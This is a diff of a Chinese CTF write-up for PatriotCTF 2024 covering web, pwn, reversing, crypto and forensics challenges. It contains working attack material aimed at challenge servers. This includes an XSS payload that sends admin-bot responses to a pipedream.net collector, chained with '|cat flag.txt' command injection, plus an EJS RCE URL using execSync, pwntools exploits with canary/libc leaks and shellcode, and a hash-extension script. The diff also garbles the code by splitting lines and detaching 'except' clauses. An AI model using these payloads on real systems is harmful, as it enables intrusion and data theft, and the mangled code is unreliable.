@@ -57,12 +57,13 @@ def main():
         session['is_admin'] = True
         session['uid'] = str(uid)
         return "1"
-@app.route('/user/<uid>')
+@app.route('/user/')
 def user_page(uid):
     """Display the user's session page based on their UUID."""
     try:
         uid = uuid.UUID(uid)
-    except ValueError:
+    
+except ValueError:
         abort(404)
     session['is_admin'] = False
     return 'Welcome Guest! Sadly, you are not admin and cannot view the flag.'
@@ -82,7 +83,8 @@ def status():
     uptime = current_time - server_start_time
     formatted_uptime = str(uptime).split('.')[0]
     formatted_current_time = current_time.strftime('%Y-%m-%d %H:%M:%S')
-    status_content = f"""Server uptime: {formatted_uptime}<br>
+    status_content = f"""Server uptime: {formatted_uptime}
+
     Server time: {formatted_current_time}
     """
     return status_content
@@ -97,8 +99,10 @@ username 是注入点，写 xss 让 adminbot 访问 /api/cal 再把结果带出�
 
 13337 端口
 
-POST http://chal.competitivecyber.club:13337/api/stats HTTP/1.1
-Host: chal.competitivecyber.club:13337
+POST http://chal.competitivecyber.club:
+13337/api/stats HTTP/1.1
+Host: chal.competitivecyber.club:
+13337
 Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.58 Safari/537.36
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
@@ -109,12 +113,16 @@ Connection: close
 Content-Type: application/json
 Content-Length: 325
 
-{"username":"<script>xmlhttp=new XMLHttpRequest();xmlhttp.withCredentials=true;xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){window.open('https://eog62dv2ryao10.m.pipedream.net?a=' + xmlhttp.responseText)}};xmlhttp.open('GET','http://127.0.0.1:1337/api/cal',true);xmlhttp.send();</script>","high_score":999}
+{"username":"<script>xmlhttp=new XMLHttpRequest();xmlhttp.withCredentials=true;xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){window.open('https://eog62dv2ryao10.m.pipedream.net?a=' + xmlhttp.responseText)}};xmlhttp.open('GET','http://127.0.0.1:
+1337/api/cal',true);xmlhttp.send();</script>","high_score":
+999}
 
 后面拼一个命令执行
 
-POST http://chal.competitivecyber.club:13337/api/stats HTTP/1.1
-Host: chal.competitivecyber.club:13337
+POST http://chal.competitivecyber.club:
+13337/api/stats HTTP/1.1
+Host: chal.competitivecyber.club:
+13337
 Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.58 Safari/537.36
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
@@ -125,7 +133,9 @@ Connection: close
 Content-Type: application/json
 Content-Length: 348
 
-{"username":"<script>xmlhttp=new XMLHttpRequest();xmlhttp.withCredentials=true;xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){window.open('https://eog62dv2ryao10.m.pipedream.net?a=' + xmlhttp.responseText)}};xmlhttp.open('GET','http://127.0.0.1:1337/api/cal?modifier=|cat flag.txt',true);xmlhttp.send();</script>","high_score":999}
+{"username":"<script>xmlhttp=new XMLHttpRequest();xmlhttp.withCredentials=true;xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){window.open('https://eog62dv2ryao10.m.pipedream.net?a=' + xmlhttp.responseText)}};xmlhttp.open('GET','http://127.0.0.1:
+1337/api/cal?modifier=|cat flag.txt',true);xmlhttp.send();</script>","high_score":
+999}
 
 这里请求发的是 https 的，不能nc监听，用的是 pipedream
 
@@ -262,7 +272,8 @@ for salt_len in range(12, 13):
     # print(encoded_joined_buf)
 
     res = requests.get(
-        "http://chal.competitivecyber.club:7777/view.php?pic=%s&hash=%s"
+        "http://chal.competitivecyber.club:
+7777/view.php?pic=%s&hash=%s"
         % (encoded_joined_buf, joined_buf_hash)
     ).content
     if "Invalid".encode() not in res:
@@ -316,7 +327,8 @@ app.listen(PORT, () => {
 客户端请求
 
 POST /check HTTP/1.1
-Host: ServerIP:3000
+Host: ServerIP:
+3000
 Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
@@ -327,7 +339,8 @@ Connection: keep-alive
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 40
 
-url=http://ServerIP:3000/get-json
+url=http://ServerIP:
+3000/get-json
 
 Flag
 
@@ -341,7 +354,8 @@ ejs rce，请求远程服务器把环境打崩了
 
 换了个有回显的 poc
 
-http://chal.competitivecyber.club:3000/?settings[view%20options][client]=1&settings[view%20options][escape]={}.constructor.constructor(%22return%20process.mainModule.require(%27child_process%27).execSync(%27cat%20flag-6637c8dd34.txt%27)%22)
+http://chal.competitivecyber.club:
+3000/?settings[view%20options][client]=1&settings[view%20options][escape]={}.constructor.constructor(%22return%20process.mainModule.require(%27child_process%27).execSync(%27cat%20flag-6637c8dd34.txt%27)%22)
 
 ❝
 
@@ -424,9 +438,12 @@ def exp():
         exit(0)
 
     idxx = data.index(b"x7f")
-    canary = u64(data[idxx-0x15:idxx-0x15+8])
-    libc_base = u64(data[idxx-5:idxx+1]+b"x00x00") - 0x29d90
-    pie = u64(data[idxx+11:idxx+17]+b"x00x00") - 0x14f5
+    canary = u64(data[idxx-0x15:
+idxx-0x15+8])
+    libc_base = u64(data[idxx-5:
+idxx+1]+b"x00x00") - 0x29d90
+    pie = u64(data[idxx+11:
+idxx+17]+b"x00x00") - 0x14f5
     print(hex(libc_base))
     print(hex(pie))
     print(hex(canary))
@@ -461,7 +478,8 @@ sl      = lambda data               :io.sendline(data)
 sla     = lambda tag,data           :io.sendlineafter(tag, data)
 r       = lambda num=4096           :io.recv(num)
 ru      = lambda tag, drop=True     :io.recvuntil(tag, drop)
-l64     = lambda      :u64(io.recvuntil("x7f")[-6:].ljust(8,b"x00"))
+l64     = lambda      :
+u64(io.recvuntil("x7f")[-6:].ljust(8,b"x00"))
 
 io = process("./pwn")
 elf = ELF("./pwn")
@@ -536,7 +554,8 @@ sl      = lambda data               :io.sendline(data)
 sla     = lambda tag,data           :io.sendlineafter(tag, data)
 r       = lambda num=4096           :io.recv(num)
 ru      = lambda tag, drop=True     :io.recvuntil(tag, drop)
-l64     = lambda      :u64(io.recvuntil("x7f")[-6:].ljust(8,b"x00"))
+l64     = lambda      :
+u64(io.recvuntil("x7f")[-6:].ljust(8,b"x00"))
 
 io = process("./pwn")
 
@@ -672,7 +691,7 @@ import secrets
 # fourth=''
 # for each in third:
 # fourth+=flipFlops(each)
- 
+
 # fifth='Mwahahaha you will n'+fourth[0:10]+'ever crack into my pass'+fourth[10:]+"word, i'll even give you the key and the executable:::: "+bittysEnc
 
 fourth='Ocmu{9gtufMmQg8G0eCXWi3MY9QfZ0NjCrXhzJEj50fumttU0ymp'
@@ -1407,12 +1426,13 @@ def main():
         session['is_admin'] = True
         session['uid'] = str(uid)
         return "1"
-@app.route('/user/<uid>')
+@app.route('/user/')
 def user_page(uid):
     """Display the user's session page based on their UUID."""
     try:
         uid = uuid.UUID(uid)
-    except ValueError:
+    
+except ValueError:
         abort(404)
     session['is_admin'] = False
     return 'Welcome Guest! Sadly, you are not admin and cannot view the flag.'
@@ -1432,19 +1452,17 @@ def status():
     uptime = current_time - server_start_time
     formatted_uptime = str(uptime).split('.')[0]
     formatted_current_time = current_time.strftime('%Y-%m-%d %H:%M:%S')
-    status_content = f"""Server uptime: {formatted_uptime}<br>
+    status_content = f"""Server uptime: {formatted_uptime}
+
     Server time: {formatted_current_time}
     """
     return status_content
 if __name__ == '__main__':
     app.run("0.0.0.0", port=9999)
-```
-
-
-
-```
-POST http://chal.competitivecyber.club:13337/api/stats HTTP/1.1
-Host: chal.competitivecyber.club:13337
+POST http://chal.competitivecyber.club:
+13337/api/stats HTTP/1.1
+Host: chal.competitivecyber.club:
+13337
 Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.58 Safari/537.36
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
@@ -1455,14 +1473,13 @@ Connection: close
 Content-Type: application/json
 Content-Length: 325
 
-{"username":"<script>xmlhttp=new XMLHttpRequest();xmlhttp.withCredentials=true;xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){window.open('https://eog62dv2ryao10.m.pipedream.net?a=' + xmlhttp.responseText)}};xmlhttp.open('GET','http://127.0.0.1:1337/api/cal',true);xmlhttp.send();</script>","high_score":999}
-```
-
-
-
-```
-POST http://chal.competitivecyber.club:13337/api/stats HTTP/1.1
-Host: chal.competitivecyber.club:13337
+{"username":"<script>xmlhttp=new XMLHttpRequest();xmlhttp.withCredentials=true;xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){window.open('https://eog62dv2ryao10.m.pipedream.net?a=' + xmlhttp.responseText)}};xmlhttp.open('GET','http://127.0.0.1:
+1337/api/cal',true);xmlhttp.send();</script>","high_score":
+999}
+POST http://chal.competitivecyber.club:
+13337/api/stats HTTP/1.1
+Host: chal.competitivecyber.club:
+13337
 Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.58 Safari/537.36
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
@@ -1473,12 +1490,9 @@ Connection: close
 Content-Type: application/json
 Content-Length: 348
 
-{"username":"<script>xmlhttp=new XMLHttpRequest();xmlhttp.withCredentials=true;xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){window.open('https://eog62dv2ryao10.m.pipedream.net?a=' + xmlhttp.responseText)}};xmlhttp.open('GET','http://127.0.0.1:1337/api/cal?modifier=|cat flag.txt',true);xmlhttp.send();</script>","high_score":999}
-```
-
-
-
-```
+{"username":"<script>xmlhttp=new XMLHttpRequest();xmlhttp.withCredentials=true;xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){window.open('https://eog62dv2ryao10.m.pipedream.net?a=' + xmlhttp.responseText)}};xmlhttp.open('GET','http://127.0.0.1:
+1337/api/cal?modifier=|cat flag.txt',true);xmlhttp.send();</script>","high_score":
+999}
 import struct
 import base64
 import urllib.parse
@@ -1606,7 +1620,8 @@ for salt_len in range(12, 13):
     # print(encoded_joined_buf)
 
     res = requests.get(
-        "http://chal.competitivecyber.club:7777/view.php?pic=%s&hash=%s"
+        "http://chal.competitivecyber.club:
+7777/view.php?pic=%s&hash=%s"
         % (encoded_joined_buf, joined_buf_hash)
     ).content
     if "Invalid".encode() not in res:
@@ -1615,17 +1630,7 @@ for salt_len in range(12, 13):
         print(joined_buf)
         print(encoded_joined_buf)
         print(res)
-```
-
-
-
-```
 pctf{3xt3nd_my_th4nk5_e9b5f6aa07}
-```
-
-
-
-```
 const express = require('express');
 const app = express();
 
@@ -1656,13 +1661,9 @@ const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
     console.log(`Server is running on http://localhost:${PORT}`);
 });
-```
-
-
-
-```
 POST /check HTTP/1.1
-Host: ServerIP:3000
+Host: ServerIP:
+3000
 Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
@@ -1673,30 +1674,12 @@ Connection: keep-alive
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 40
 
-url=http://ServerIP:3000/get-json
-```
-
-
-
-```
+url=http://ServerIP:
+3000/get-json
 PCTF{Y0u_D00m3D_U5_Man_So_SAD}
-```
-
-
-
-```
 ?settings[view%20options][escapeFunction]=console.log;this.global.process.mainModule.require(%27child_process%27).execSync("touch /tmp/3.txt");&settings[view%20options][client]=true
-```
-
-
-
-```
-http://chal.competitivecyber.club:3000/?settings[view%20options][client]=1&settings[view%20options][escape]={}.constructor.constructor(%22return%20process.mainModule.require(%27child_process%27).execSync(%27cat%20flag-6637c8dd34.txt%27)%22)
-```
-
-
-
-```
+http://chal.competitivecyber.club:
+3000/?settings[view%20options][client]=1&settings[view%20options][escape]={}.constructor.constructor(%22return%20process.mainModule.require(%27child_process%27).execSync(%27cat%20flag-6637c8dd34.txt%27)%22)
 from pwn import *
 io = remote("",)
 def exp():
@@ -1710,11 +1693,6 @@ def exp():
 
 exp()
 io.interactive()
-```
-
-
-
-```
 from pwn import *
 
 io = remote("",)
@@ -1741,11 +1719,6 @@ def exp():
     
 exp()
 io.interactive()
-```
-
-
-
-```
 from pwn import *
 
 io = remote("",)
@@ -1770,9 +1743,12 @@ def exp():
         exit(0)
 
     idxx = data.index(b"x7f")
-    canary = u64(data[idxx-0x15:idxx-0x15+8])
-    libc_base = u64(data[idxx-5:idxx+1]+b"x00x00") - 0x29d90
-    pie = u64(data[idxx+11:idxx+17]+b"x00x00") - 0x14f5
+    canary = u64(data[idxx-0x15:
+idxx-0x15+8])
+    libc_base = u64(data[idxx-5:
+idxx+1]+b"x00x00") - 0x29d90
+    pie = u64(data[idxx+11:
+idxx+17]+b"x00x00") - 0x14f5
     print(hex(libc_base))
     print(hex(pie))
     print(hex(canary))
@@ -1794,11 +1770,6 @@ def exp():
 
 exp()
 io.interactive()
-```
-
-
-
-```
 from pwn import *
 
 s       = lambda data               :io.send(data)
@@ -1807,7 +1778,8 @@ sl      = lambda data               :io.sendline(data)
 sla     = lambda tag,data           :io.sendlineafter(tag, data)
 r       = lambda num=4096           :io.recv(num)
 ru      = lambda tag, drop=True     :io.recvuntil(tag, drop)
-l64     = lambda      :u64(io.recvuntil("x7f")[-6:].ljust(8,b"x00"))
+l64     = lambda      :
+u64(io.recvuntil("x7f")[-6:].ljust(8,b"x00"))
 
 io = process("./pwn")
 elf = ELF("./pwn")
@@ -1869,11 +1841,6 @@ def exp():
 
 exp()
 io.interactive()
-```
-
-
-
-```
 from pwn import *
 
 s       = lambda data               :io.send(data)
@@ -1882,7 +1849,8 @@ sl      = lambda data               :io.sendline(data)
 sla     = lambda tag,data           :io.sendlineafter(tag, data)
 r       = lambda num=4096           :io.recv(num)
 ru      = lambda tag, drop=True     :io.recvuntil(tag, drop)
-l64     = lambda      :u64(io.recvuntil("x7f")[-6:].ljust(8,b"x00"))
+l64     = lambda      :
+u64(io.recvuntil("x7f")[-6:].ljust(8,b"x00"))
 
 io = process("./pwn")
 
@@ -1932,11 +1900,6 @@ def exp():
 
 exp()
 io.interactive()
-```
-
-
-
-```
 from pwn import *
 context.log_level = "debug"
 context.arch = "mips"
@@ -1972,11 +1935,6 @@ io.sendline(shellcode)
 io.recvuntil(b">> ")
 io.sendline(b"3")
 io.interactive()
-```
-
-
-
-```
 from base64 import b64decode, b64encode
 import secrets
 
@@ -1992,7 +1950,7 @@ import secrets
 # fourth=''
 # for each in third:
 # fourth+=flipFlops(each)
- 
+
 # fifth='Mwahahaha you will n'+fourth[0:10]+'ever crack into my pass'+fourth[10:]+"word, i'll even give you the key and the executable:::: "+bittysEnc
 
 fourth='Ocmu{9gtufMmQg8G0eCXWi3MY9QfZ0NjCrXhzJEj50fumttU0ymp'
@@ -2006,11 +1964,6 @@ one=int.from_bytes(third)^int.from_bytes(bittys)
 first=one.to_bytes(len(third))
 print(first)
 #PCTF{I_<3_$3CUR1TY_THR0UGH_0B5CUR1TY!!}
-```
-
-
-
-```
 int main() {
  FILE* f = fopen("E:\oj\2024CTFWXX\2024PatriotCTF\VMception\vm_program.bin", "rb");
  fseek(f, 0, 2);
@@ -2034,11 +1987,6 @@ int main() {
  return 0;
 }
 //pctf{nest3d_vm_s3cr3ts}
-```
-
-
-
-```
 int main() {
  FILE* f = fopen("E:\oj\2024CTFWXX\2024PatriotCTF\Notanothervmreversingproblem\not_another_vm.prog", "rb");
  fseek(f, 0, 2);
@@ -2057,11 +2005,6 @@ int main() {
  return 0;
 }
 //pctf{th1s_vm_pr0blem_was_e4sy}
-```
-
-
-
-```
 result=[0xa5,0x39,0x24,0x90,0xa8,0xa5,0x88,0x77,0x26,0xe4,0x3c,0x14,0x03,0x1e,0xba,0x3c,0x7d,0xbb,0xdc,0xd6,0xaa,0x90,0x50,0xc9,0x0f,0xaa,0xdd,0x57,0x33,0xe1,0xa4,0xc7]
 
 def func(s1,s2):
@@ -2471,12 +2414,7 @@ for i in range(len(result)):
         tmp=(ord(c)*i)%255
         if tmp==result[i]:
             print(c,end=' ')
-#pctf{d33p_le@rnING}
-```
-
-
-
-```
+    #pctf{d33p_le@rnING}
 import base64
 srt_key = 'secretkey'
 enc = base64.b64decode("QRVWUFdWEUpdXEVGCF8DVEoYEEIBBlEAE0dQAURFD1I=")
@@ -2491,11 +2429,6 @@ for i in range(0,len(enc),2):
     res_rsv.append(c2)
 
 print("pctf{"+"".join(res)+"".join(res_rsv[::-1])+"}")
-```
-
-
-
-```
 import gmpy2
 import libnum
 
@@ -2542,11 +2475,6 @@ c = 0x731ceb0ac8f10c8ff82450b61b414c4f7265ccf9f73b8e238cc7265f83c635575a9381aa
 d = wienerAttack(e, N)
 m = pow(c, d, N)
 print(libnum.n2s(m))
-```
-
-
-
-```
 from pwn import *
 
 io = remote("chal.competitivecyber.club",6001)
@@ -2564,11 +2492,6 @@ for i in range(16):
             flag += int.to_bytes(j)
             print(flag)
             break
-```
-
-
-
-```
 from Crypto.Util.number import *
 data = open("out.txt","r").read().replace("n","")
 res = [[0]*16]*(len(data)//32)
@@ -2596,17 +2519,7 @@ for i in range(0,len(data),32):
     res += long_to_bytes(decoded)
 
 print(res)
-```
-
-
-
-```
 ip.src == 10.151.198.69 and not quic and tcp.port == 22993
-```
-
-
-
-```
 import time
 import math
 import sys
@@ -2620,7 +2533,8 @@ def decrypt(encrypt_bytes, current_time):
     temp1 = data_bytes_len // init_key_len
     temp2 = data_bytes_len % init_key_len
     key_bytes *= temp1
-    key_bytes += key_bytes[:temp2]
+    key_bytes += key_bytes[:
+temp2]
     
     # Decrypt by XORing again with the same key
     decrypted_bytes = bytes((a ^ b for a, b in zip(key_bytes, encrypt_bytes)))
@@ -2652,11 +2566,6 @@ def main():
 
 if __name__ == '__main__':
     main()
-```
-
-
-
-```
 python3 decrypt.py encrypted_whole.bin 1726595769 
 file encrypted_whole.bin
 mv encrypted_whole.bin encrypted_whole.jpg
